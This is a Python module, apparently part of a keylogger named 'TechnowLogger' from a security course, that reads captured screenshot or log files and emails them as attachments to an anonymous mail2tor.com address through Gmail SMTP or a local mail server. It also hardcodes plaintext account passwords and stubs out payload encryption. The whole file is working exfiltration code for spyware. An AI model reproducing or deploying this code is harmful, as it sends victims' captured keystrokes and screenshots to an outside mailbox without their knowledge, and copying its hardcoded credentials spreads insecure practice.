# Python code to illustrate Sending mail from 
# your Gmail account 
import smtplib
# import xsmtplib
import time
import os
import datetime
import pip
import sys
sys.path.append("/Library/Frameworks/Python.framework/Versions/3.8/lib/python3.8/site-packages") 
import schedule
from constants import DEFAULT_LOG_MODE, LOG_DIR
from email.mime.text import MIMEText              
from email.mime.multipart import MIMEMultipart  
from email.mime.application import MIMEApplication 
from os.path import basename
from email.mime.text import MIMEText
# from algo import encrypt_msg, decrypt_msg

def send_mail_with_image(filename):
    time.sleep(5)
    sender_email = "testforcsce689@gmail.com"
    receiver_email = "testforcsce689@mail2tor.com"
    # receiver_email = "tennis1038@gmail.com"
    # password = "Testforcsce689" # tor mail
    password = "Testcsce689" # gmail
    # try:
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "TechnowLogger Reporting With Screenshot Attachments"
    text = "\nReport From:\n\n" + filename
    msg.attach(MIMEText(text))
    
    with open(filename, "rb") as fil: 
        # encrypted_msg = encrypt_msg(fil)
        attachedfile = MIMEApplication(fil.read())
        attachedfile.add_header(
            'content-disposition', 'attachment' )
        msg.attach(attachedfile)

    smtp = smtplib.SMTP(host="smtp.gmail.com", port= 587) 
    smtp.starttls()

    # smtp = smtplib.SMTP("91.234.99.184",port=25)
    # smtp.starttls()
    smtp.login(sender_email, password)
    smtp.sendmail(sender_email, receiver_email, msg.as_string())
    smtp.close()

def send_mail_with_attachment(filename):
    time.sleep(5)
    sender_email = "testforcsce689@gmail.com"
    receiver_email = "testforcsce689@mail2tor.com"
    # receiver_email = "tennis1038@gmail.com"
    # password = "Testforcsce689" # tor mail
    password = "Testcsce689" # gmail
    # try:
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "TechnowLogger Reporting With Screenshot Attachments"
    text = "\nReport From:\n\n" + filename
    msg.attach(MIMEText(text))
    
    with open(filename, "rb") as fil: 
        # encrypted_msg = encrypt_msg(fil.read())
        attachedfile = MIMEApplication(fil.read())
        attachedfile.add_header(
            'content-disposition', 'attachment' )
        msg.attach(attachedfile)

    smtp = smtplib.SMTP(host="smtp.gmail.com", port= 587) 
    smtp.starttls()

    # smtp = smtplib.SMTP("91.234.99.184",port=25)
    # smtp.starttls()
    smtp.login(sender_email, password)
    smtp.sendmail(sender_email, receiver_email, msg.as_string())
    # print(decrypt_msg(msg.as_string()))
    smtp.close()

def send_mail_with_attachment_without_login(filename):
    time.sleep(5)
    SERVER = "localhost"
    sender_email = "testforcsce689@mail2tor.com"
    receiver_email = ["testforcsce689@mail2tor.com"]
    # password = "Testforcsce689" # tor mail
    # password = "Testcsce689" # gmail
    # try:
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "TechnowLogger Reporting With Screenshot Attachments"
    text = "\nReport From:\n\n" + filename
    msg.attach(MIMEText(text))

    with open(filename, "rb") as fil: 
        attachedfile = MIMEApplication(fil.read())
        attachedfile.add_header(
            'content-disposition', 'attachment' )
        msg.attach(attachedfile)
    server = smtplib.SMTP(SERVER)
    server.sendmail(sender_email, receiver_email, msg.as_string())
    server.quit()

import chilkat
def send_mail_wo_login():
    # The mailman object is used for sending and receiving email.
    mailman = chilkat.CkMailMan()

    # Set the SMTP server.  Perhaps it is the local machine.
    mailman.put_SmtpHost("localhost")

    # Set the SmtpAuthMethod property = "NONE"
    mailman.put_SmtpAuthMethod("NONE")

    # Set the SMTP login/password (this may be omitted given no authentication will take place)
    # mailman.SmtpUsername = "myUsername";
    # mailman.SmtpPassword = "myPassword";

    # Create a new email object
    email = chilkat.CkEmail()

    email.put_Subject("This is a test")
    email.put_Body("This is a test")
    email.put_From("Chilkat Support <testforcsce689@gmail.com>")
    success = email.AddTo("Chilkat Admin","tennis1038@gmail.com")
    # To add more recipients, call AddTo, AddCC, or AddBcc once per recipient.

    # Call SendEmail to connect to the SMTP server and send.
    # The connection (i.e. session) to the SMTP server remains
    # open so that subsequent SendEmail calls may use the
    # same connection.  
    success = mailman.SendEmail(email)
    if (success != True):
        print(mailman.lastErrorText())
        sys.exit()

    # Some SMTP servers do not actually send the email until 
    # the connection is closed.  In these cases, it is necessary to
    # call CloseSmtpConnection for the mail to be  sent.  
    # Most SMTP servers send the email immediately, and it is 
    # not required to close the connection.  We'll close it here
    # for the example:
    success = mailman.CloseSmtpConnection()
    if (success != True):
        print("Connection to SMTP server not closed cleanly.")

    print("Mail Sent!")